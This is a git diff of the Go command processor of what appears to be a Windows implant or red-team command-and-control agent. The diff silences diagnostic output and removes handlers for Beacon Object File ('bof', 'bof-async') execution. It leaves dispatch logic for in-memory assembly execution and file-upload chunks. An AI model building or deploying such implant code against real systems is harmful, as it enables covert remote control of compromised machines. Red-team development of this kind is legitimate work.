@@ -1,4 +1,5 @@
 // server/docker/payloads/Windows/command_processor.go
+
 //go:build windows
 // +build windows
 
@@ -7,7 +8,8 @@ package main
 import (
 	"encoding/json"
 	"fmt"
-	"os"
+
+	//"os"
 	"strings"
 	"time"
 )
@@ -25,10 +27,10 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	cq.mu.Unlock()
 
 	// Add this diagnostic
-	fmt.Fprintf(os.Stderr, "DIAGNOSTIC: Processing command type: %s\n", cmd.Command)
-	if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
-		fmt.Fprintf(os.Stderr, "WARNING: Command struct would print as: %v\n", cmd)
-	}
+	//fmt.Fprintf(os.Stderr, "DIAGNOSTIC: Processing command type: %s\n", cmd.Command)
+	//if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
+	//	fmt.Fprintf(os.Stderr, "WARNING: Command struct would print as: %v\n", cmd)
+	//}
 
 	// Set the current command in context
 	cq.cmdContext.mu.Lock()
@@ -83,7 +85,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle inline-assembly-output command WITH arguments
 	if strings.HasPrefix(cmd.Command, "inline-assembly-output ") {
-		fmt.Printf("DEBUG: Executing inline-assembly-output command with args\n")
 		parts := strings.Fields(cmd.Command)
 		if handler, exists := cq.cmdRegistry["inline-assembly-output"]; exists {
 			args := []string{}
@@ -141,46 +142,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}, nil
 		}
-	}
-
-	// Handle BOF async commands
-	if strings.HasPrefix(cmd.Command, "bof-async") && cmd.Data != "" {
-
-		// Parse the JSON data
-		var bofConfig map[string]interface{}
-		if err := json.Unmarshal([]byte(cmd.Data), &bofConfig); err != nil {
-			// Fall back to treating it as raw BOF data for backwards compatibility
-			result := cq.processBOFAsync(cmd)
-			return &result, nil
-		}
-
-		// Extract the actual BOF data from the JSON
-		if bofData, ok := bofConfig["bof_data"].(string); ok {
-			cmd.Data = bofData // Replace with the actual BOF data
-		}
-
-		result := cq.processBOFAsync(cmd)
-		return &result, nil
-	}
-
-	// Handle regular BOF commands
-	if strings.HasPrefix(cmd.Command, "bof") && cmd.Data != "" {
-
-		// Parse the JSON data
-		var bofConfig map[string]interface{}
-		if err := json.Unmarshal([]byte(cmd.Data), &bofConfig); err != nil {
-			// Fall back to treating it as raw BOF data for backwards compatibility
-			result := cq.processBOF(cmd)
-			return &result, nil
-		}
-
-		// Extract the actual BOF data from the JSON
-		if bofData, ok := bofConfig["bof_data"].(string); ok {
-			cmd.Data = bofData // Replace with the actual BOF data
-		}
-
-		result := cq.processBOF(cmd)
-		return &result, nil
 	}
 
 	// Handle upload chunks
@@ -281,7 +242,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		cmdType = args[0]
 		cmdArgs = args[1:]
 	}
-
 
 	// Look up command handler
 	if handler, exists := cq.cmdRegistry[cmdType]; exists {
